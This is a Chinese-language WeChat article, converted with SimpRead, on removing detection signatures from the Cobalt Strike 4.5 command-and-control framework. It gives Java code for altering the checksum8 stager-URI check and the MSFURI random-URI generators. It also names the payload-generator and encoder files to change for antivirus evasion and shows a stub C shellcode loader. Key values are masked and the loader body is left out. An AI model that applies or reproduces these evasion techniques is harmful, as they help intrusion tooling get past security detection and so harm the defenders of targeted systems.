<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bBMydFwC98HytUU6SGLjQg)

cobaltstrike4.5 特征消除 2

修改了内置 stage 的配置，实现硬性特征消除

修改部分 payload，实现基本免杀

![](https://mmbiz.qpic.cn/mmbiz_png/ZMDicxS3zWmjw8VHpUOjXicjRicBlQjfqf9ibUye6RZPcR72nuibDWgMdt89Bp5ubaclFQIaibaV9xWEIZib2SeWKPNTA/640?wx_fmt=png)

修改 checksum8 判等参数

![](https://mmbiz.qpic.cn/mmbiz_png/ZMDicxS3zWmjw8VHpUOjXicjRicBlQjfqf9uemo7QXq5aJ07hFClS20er6ibNkjFNsGNamjpulVcwVYCRWWZII5hGQ/640?wx_fmt=png)  

```
public static long checksum8(String text) {
if (text.length() < 4) {
return 0L;
}
text = text.replace("/", "");
long sum = 0L;
for (int x = 0; x < text.length(); ++x) {
sum += text.charAt(x);
}
return sum ;
}
```

修改随机生成算法  

写入方法, 传值

```
public static void main(String []args) {
        String key = "0797809e694f99998172aec328c672f26eea6a664.cs";
        long flag = checksum8(key);
        System.out.println(flag);
    \}\}
```

```
public static boolean isStager(String uri) {
   return checksum8(uri) == ****;
```

修改传值

修改 common/CommonUtils 的

```
public static String MSFURI(final int n) {
final String[] array = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
StringBuffer sb;
do {
sb = new StringBuffer(n + 1);
sb.append("/");
for (int i = 0; i < n; ++i) {
sb.append(pick(array));
}
} while (checksum8(sb.toString()) != ****);
return
```

```
public static String MSFURI_X64() {
final String[] array = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
String string;
do {
string = "/" + pick(array) + pick(array) + pick(array) + pick(array);
} while (checksum8(string) != ****);
```

修改 return 的结果和判等结果

简单免杀

修改

/aggressor/dialogs/PayloadGeneratorDialog.java

encoders/Transforms.java

自定义加载器

```
#include <windows.h>
#include <stdio.h>
unsigned char buf[] ="";
void main(){   
   ***
}
```

重新打包跑就行了

关于 beacon 的部分不方便多说，就没写到这里

后续看看要不要公开吧

文章来源：冰棱安全团队

```
>精彩回顾<


干货 | 红队快速批量打点的利器


【干货】最全的Tomcat漏洞复现

{Vulhub漏洞复现（一）ActiveMQ}

{Vulhub漏洞复现（二） Apereo CAS}

Cobalt Strike免杀脚本生成器|cna脚本|bypassAV

xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法


【贼详细 | 附PoC工具】Apache HTTPd最新RCE漏洞复现


干货 | 横向移动与域控权限维持方法总汇

干货 | 免杀ShellCode加载框架

【干货】phpMyAdmin漏洞利用汇总

【神兵利器 | 附下载】一个用于隐藏C2的、开箱即用的Tools


分享 | 个人渗透技巧汇总（避坑）笔记


关注我

获得更多精彩




坚持学习与分享！走过路过点个"在看"，不会错过

仅用于学习交流，不得用于非法用途

如侵权请私聊公众号删文

觉得文章不错给点个‘再看’吧
```